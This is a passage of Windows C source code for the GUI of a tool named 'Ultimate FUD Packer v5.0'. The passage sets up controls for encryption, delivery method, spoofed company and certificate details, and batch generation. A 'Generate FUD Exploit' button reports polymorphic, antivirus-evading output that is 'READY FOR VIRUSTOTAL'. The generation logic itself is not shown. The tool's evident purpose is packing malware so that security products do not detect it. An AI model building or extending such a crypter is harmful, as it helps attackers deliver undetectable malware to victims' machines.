            CreateWindowA("STATIC", "Architecture:", WS_VISIBLE | WS_CHILD,
                        10, 140, 80, 20, hwnd, NULL, NULL, NULL);
            hArchCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        100, 138, 120, 200, hwnd, (HMENU)ID_ARCHITECTURE_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Encryption:", WS_VISIBLE | WS_CHILD,
                        230, 140, 80, 20, hwnd, NULL, NULL, NULL);
            hEncryptionCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        320, 138, 140, 200, hwnd, (HMENU)ID_ENCRYPTION_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Delivery:", WS_VISIBLE | WS_CHILD,
                        10, 180, 80, 20, hwnd, NULL, NULL, NULL);
            hDeliveryCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        100, 178, 140, 200, hwnd, (HMENU)ID_DELIVERY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Compiler:", WS_VISIBLE | WS_CHILD,
                        250, 180, 70, 20, hwnd, NULL, NULL, NULL);
            hCompilerCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        330, 178, 190, 200, hwnd, (HMENU)ID_COMPILER_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Batch Count:", WS_VISIBLE | WS_CHILD,
                        10, 220, 80, 20, hwnd, NULL, NULL, NULL);
            hBatchCount = CreateWindowA("EDIT", "1", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER,
                        100, 218, 60, 24, hwnd, (HMENU)ID_BATCH_COUNT, NULL, NULL);
            
            hAutoFilename = CreateWindowA("BUTTON", "Auto-generate filenames", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
                        170, 218, 160, 24, hwnd, (HMENU)ID_AUTO_FILENAME, NULL, NULL);
            
            hCreateButton = CreateWindowA("BUTTON", "Generate FUD Exploit", WS_VISIBLE | WS_CHILD,
                        350, 215, 150, 30, hwnd, (HMENU)ID_CREATE_BUTTON, NULL, NULL);
            
            hProgressBar = CreateWindowA("msctls_progress32", NULL, WS_VISIBLE | WS_CHILD,
                        10, 260, 510, 25, hwnd, (HMENU)ID_PROGRESS_BAR, NULL, NULL);
            
            hStatusText = CreateWindowA("STATIC", "Ultimate FUD Generator v5.0 - With Advanced Compiler Detection", WS_VISIBLE | WS_CHILD,
                        10, 295, 510, 20, hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
            
            // Apply font to all controls
            if (hFont) {
                SendMessage(hInputPath, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hOutputPath, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCompanyCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCertCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hArchCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hEncryptionCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hDeliveryCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCompilerCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hBatchCount, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hAutoFilename, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCreateButton, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hStatusText, WM_SETFONT, (WPARAM)hFont, TRUE);
            }
            
            // Populate all combos
            populateCompanyCombo();
            populateCertificateCombo();
            populateArchitectureCombo();
            populateEncryptionCombo();
            populateDeliveryCombo();
            populateCompilerCombo();
            
            return 0;
        }
        
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_BROWSE_INPUT:
                    browseForFile(hInputPath, TRUE);
                    break;
                    
                case ID_BROWSE_OUTPUT:
                    browseForFile(hOutputPath, FALSE);
                    break;
                    
                case ID_CREATE_BUTTON:
                    CreateExploit();
                    break;
            }
            return 0;
        }
        
        case WM_USER + 1: {
            // Generation completed
            isGenerating = FALSE;
            SetWindowTextAnsi(hCreateButton, "Generate FUD Exploit");
            EnableWindow(hCreateButton, TRUE);
            
            if (wParam) {
                SetWindowTextAnsi(hStatusText, "FUD exploit generated - READY FOR VIRUSTOTAL!");
                MessageBoxA(hwnd, "Polymorphic FUD exploit generated successfully!\n\nFeatures:\n- Advanced compiler detection\n- Multiple compiler support\n- Unique hash per generation\n- All encryption methods functional\n- Ready for VirusTotal testing", 
                           "FUD GENERATION SUCCESS", MB_OK | MB_ICONINFORMATION);
            } else {
                SetWindowTextAnsi(hStatusText, "Generation failed - check output directory");
                MessageBoxA(hwnd, "Generation failed. Please check compiler selection and try again.", "Generation Error", MB_OK | MB_ICONERROR);
            }
            
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_USER + 2: {
            int currentBatch = LOWORD(wParam);
            int totalBatches = HIWORD(wParam);
            char statusMsg[128];
            if (totalBatches > 1) {
                snprintf(statusMsg, sizeof(statusMsg), "Creating FUD exploit %d of %d...", currentBatch + 1, totalBatches);
            } else {
                snprintf(statusMsg, sizeof(statusMsg), "Generating polymorphic FUD with advanced compiler...");
            }
            SetWindowTextAnsi(hStatusText, statusMsg);
            
            int progressPos = 25;
            if (totalBatches > 0) {
                progressPos = 25 + (currentBatch * 50) / totalBatches;
            }
            SendMessage(hProgressBar, PBM_SETPOS, progressPos, 0);
            return 0;
        }
        
        case WM_USER + 3: {
            SetWindowTextAnsi(hStatusText, "Auto-compiling with selected compiler...");
            SendMessage(hProgressBar, PBM_SETPOS, 75, 0);
            return 0;
        }
        
        case WM_USER + 4: {
            // Source code only success
            isGenerating = FALSE;
            SetWindowTextAnsi(hCreateButton, "Generate FUD Exploit");
            EnableWindow(hCreateButton, TRUE);
            SetWindowTextAnsi(hStatusText, "FUD source generated - manual compilation needed");
            MessageBoxA(hwnd, "Advanced polymorphic FUD source code generated!\n\nCompilation failed with all detected compilers.\nSource code saved for manual compilation.\nCheck compiler_detection.log for details.", 
                       "FUD Source Generated", MB_OK | MB_ICONINFORMATION);
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_CLOSE:
        case WM_DESTROY:
            if (hFont) DeleteObject(hFont);
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* className = "UltimateFUDPackerV50";
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    if (!RegisterClassA(&wc)) {
        MessageBoxA(NULL, "Failed to register window class", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    hMainWindow = CreateWindowExA(
        0,
        className,
        "Ultimate FUD Packer v5.0 - Advanced Compiler Detection - All Compilers Supported",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 550, 360,
        NULL, NULL, hInstance, NULL
    );
    
    if (!hMainWindow) {
        MessageBoxA(NULL, "Failed to create main window", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    ShowWindow(hMainWindow, nCmdShow);
    UpdateWindow(hMainWindow);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return (int)msg.wParam;
}